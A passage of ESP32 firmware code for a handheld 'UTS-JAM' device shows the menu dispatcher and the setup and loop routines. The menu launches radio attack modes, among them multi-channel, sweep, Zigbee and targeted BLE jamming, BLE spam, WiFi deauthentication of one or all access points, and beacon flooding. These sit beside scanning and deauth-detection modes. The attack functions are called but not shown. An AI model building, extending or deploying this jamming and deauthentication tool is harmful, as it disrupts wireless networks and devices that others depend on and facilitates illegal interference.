    case MULTI_JAM: currentState = STATE_MULTI_JAM; displayInfo("Multi Ch Jam", "Starting..."); initRadios(); safeDelay(1000); displayInfo("Multi Ch Jam", "Running", "SEL to stop"); while (!selPressed()) { singleChannel(); yield(); } currentState = STATE_MENU; drawMenu(); safeDelay(500); break;
    case SWEEP_JAM: currentState = STATE_SWEEP_JAM; displayInfo("Sweep Jammer", "Starting..."); initRadios(); safeDelay(1000); displayInfo("Sweep Jammer", "Running", "SEL to stop"); while (!selPressed()) { sweepJam(); yield(); } currentState = STATE_MENU; drawMenu(); safeDelay(500); break;
    case CHANNEL_RANGE: currentState = STATE_CHANNEL_RANGE; displayInfo("Ch Range", "Starting..."); initRadios(); safeDelay(1000); displayInfo("Ch Range", "Running", "SEL to stop"); while (!selPressed()) { channelRange(); yield(); } currentState = STATE_MENU; drawMenu(); safeDelay(500); break;
    case SPECTRUM: currentState = STATE_SPECTRUM; runSpectrum(); currentState = STATE_MENU; drawMenu(); break;
    case BLE_SPAM: currentState = STATE_BLE_SPAM; runBLESpam(); currentState = STATE_MENU; drawMenu(); break;
    case WIFI_DEAUTH: currentState = STATE_WIFI_DEAUTH; {
      int opt = 0;
      while (!selPressed()) {
        display.clearDisplay(); display.setTextSize(1); display.setTextColor(1);
        display.setCursor(0, 0); display.println("Deauth Options");
        display.setCursor(0, 10); display.print(opt == 0 ? ">" : " "); display.println("Single AP");
        display.setCursor(0, 20); display.print(opt == 1 ? ">" : " "); display.println("All APs");
        display.display();
        if (upPressed()) opt = (opt == 0) ? 1 : 0;
        if (downPressed()) opt = (opt == 0) ? 1 : 0;
        yield();
      }
      if (opt == 0) runWiFiDeauth(); else runWiFiDeauthAll();
    } currentState = STATE_MENU; drawMenu(); break;
    case BLE_SCANNER: currentState = STATE_BLE_SCANNER; runBLEScanner(); currentState = STATE_MENU; drawMenu(); break;
    case ZIGBEE_JAM: currentState = STATE_ZIGBEE_JAM; displayInfo("Zigbee Jam", "Starting..."); initRadios(); safeDelay(1000); displayInfo("Zigbee Jam", "Running", "SEL to stop"); while (!selPressed()) { zigbeeJam(); yield(); } currentState = STATE_MENU; drawMenu(); safeDelay(500); break;
    case BLE_TARGET_JAM: currentState = STATE_BLE_TARGET_JAM; runBLETargetJam(); currentState = STATE_MENU; drawMenu(); break;
    case WIFI_BEACON_FLOOD: currentState = STATE_WIFI_BEACON_FLOOD; runWiFiBeaconFlood(); currentState = STATE_MENU; drawMenu(); break;
    case WIFI_ANALYZER: currentState = STATE_WIFI_ANALYZER; runWiFiAnalyzer(); currentState = STATE_MENU; drawMenu(); break;
    case DEAUTH_DETECT: currentState = STATE_DEAUTH_DETECT; runDeauthDetect(); currentState = STATE_MENU; drawMenu(); break;
    case TEST_RADIOS: currentState = STATE_TEST_RADIOS; displayInfo("Test Radios", "Testing..."); initRadios(); safeDelay(2000); currentState = STATE_MENU; drawMenu(); break;
    case SETTINGS: showSettings(); break;
    case HELP: showHelp(); break;
  }
}

// ==========================================
// ANA PROGRAM
// ==========================================
void setup() {
  Serial.begin(115200);
  safeDelay(1000);
  Serial.println("UTS-JAM v2.0 Ultimate (C3)");
  Wire.begin(SDA_PIN, SCL_PIN);
  if (!display.begin(SSD1306_SWITCHCAPVCC, SSD1306_I2C_ADDRESS)) {
    Serial.println("OLED fail"); while (1);
  }
  pinMode(UP_BUTTON_PIN, INPUT_PULLUP);
  pinMode(DOWN_BUTTON_PIN, INPUT_PULLUP);
  pinMode(SELECT_BUTTON_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  u8g2_for_adafruit_gfx.begin(display);
  setBrightness(brightness);
  splashScreen();
  safeDelay(3000);
  drawMenu();
}

void loop() {
  if (currentState == STATE_MENU) handleMenuSelection();
}
